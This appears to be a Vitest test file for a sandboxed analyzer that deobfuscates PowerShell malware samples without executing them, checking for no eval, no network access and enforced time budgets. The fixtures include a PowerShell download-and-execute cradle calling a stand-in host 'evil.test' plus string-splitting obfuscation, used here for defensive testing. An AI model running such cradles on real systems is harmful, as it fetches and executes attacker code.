import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { analyze } from '../analyze';

describe('the payload is never handed to the JS engine', () => {
  // The property that makes it safe to paste malware in: the sample is parsed
  // and folded by a tree-walking interpreter and never evaluated. If any of
  // these were reachable, a sample could escape into the page.
  let evalSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    evalSpy = vi.spyOn(globalThis, 'eval' as never);
  });

  afterEach(() => {
    evalSpy.mockRestore();
  });

  it('never calls eval', async () => {
    await analyze(`IEX ('Write-Host ' + '"x"')`);
    expect(evalSpy).not.toHaveBeenCalled();
  });

  it('never constructs a Function from the payload', async () => {
    const original = globalThis.Function;
    const spy = vi.fn(original) as unknown as FunctionConstructor;
    globalThis.Function = spy;
    try {
      await analyze(`&('Wri'+'te-Host') "x"`);
      expect(spy).not.toHaveBeenCalled();
    } finally {
      globalThis.Function = original;
    }
  });
});

describe('analysis makes no network requests', () => {
  // connect-src 'none' proves this at the browser level and is the deployment
  // goal; this proves it at the code level, which is what a test can do.
  let fetchSpy: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    fetchSpy = vi.fn(() => Promise.reject(new Error('network attempted')));
    vi.stubGlobal('fetch', fetchSpy);
    vi.stubGlobal(
      'XMLHttpRequest',
      class {
        open(): void {
          throw new Error('network attempted');
        }
      },
    );
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('does not fetch when the sample downloads a stage', async () => {
    const result = await analyze(
      `IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')`,
    );
    expect(fetchSpy).not.toHaveBeenCalled();
    // The URL is still recovered - it is recorded, not requested.
    expect(result.iocs.indicators.some((i) => i.value.includes('evil.test'))).toBe(true);
  });

  it('does not fetch while decompressing', async () => {
    await analyze(
      `[IO.Compression.DeflateStream]::new([IO.MemoryStream][Convert]::FromBase64String('Cy/KLEnV9cgvLlFQykjNyclXyCgtzlYCAA=='),[IO.Compression.CompressionMode]::Decompress)`,
    );
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});

describe('budgets are enforced, not advisory', () => {
  it('stops at the layer budget', async () => {
    const result = await analyze("IEX ('IEX ' + \"('Write-Host 1')\")", { maxLayers: 2 });
    expect(result.layers.length).toBeLessThanOrEqual(3);
  });

  it('returns rather than hanging on pathological input', async () => {
    const started = Date.now();
    const result = await analyze('('.repeat(2000) + "'a'" + ')'.repeat(2000), {
      timeBudgetMs: 1500,
    });
    expect(Date.now() - started).toBeLessThan(8000);
    expect(result.layers.length).toBeGreaterThan(0);
  });

  it('handles an empty sample without throwing', async () => {
    const result = await analyze('');
    expect(result.layers).toHaveLength(1);
    expect(result.iocs.indicators).toHaveLength(0);
  });
});

describe('the result is self-describing', () => {
  it('reports unreliable output when something could not be computed', async () => {
    const result = await analyze('IEX ($env:COMPUTERNAME + "-payload")');
    expect(result.gaps.length).toBeGreaterThan(0);
  });

  it('separates actionable gaps from stubs and hard blocks', async () => {
    const result = await analyze(
      `(New-Object Net.WebClient).DownloadString($env:USERDOMAIN)`,
    );
    expect(result.gaps.some((g) => g.kind === 'STUB_BY_DESIGN')).toBe(true);
    expect(result.actionableGaps.every((g) => g.kind === 'GAP')).toBe(true);
  });
});

describe('the time budget binds inside a layer, not only between layers', () => {
  // Constant folding parses every parenthesised group, so deep nesting is
  // quadratic within a single layer. Checking the clock only between layers
  // let a 1.5s budget run for 8.5s on a quiet machine.
  it('honours a small budget on deeply nested input', async () => {
    const started = Date.now();
    await analyze(`${'('.repeat(2000)}'a'${')'.repeat(2000)}`, { timeBudgetMs: 800 });
    expect(Date.now() - started).toBeLessThan(5000);
  });

  it('records the budget it hit rather than failing quietly', async () => {
    const result = await analyze(`${'('.repeat(3000)}'a'${')'.repeat(3000)}`, {
      timeBudgetMs: 300,
    });
    expect(result.gaps.some((g) => /budget/.test(g.signature))).toBe(true);
    expect(result.reliable).toBe(false);
  });
});
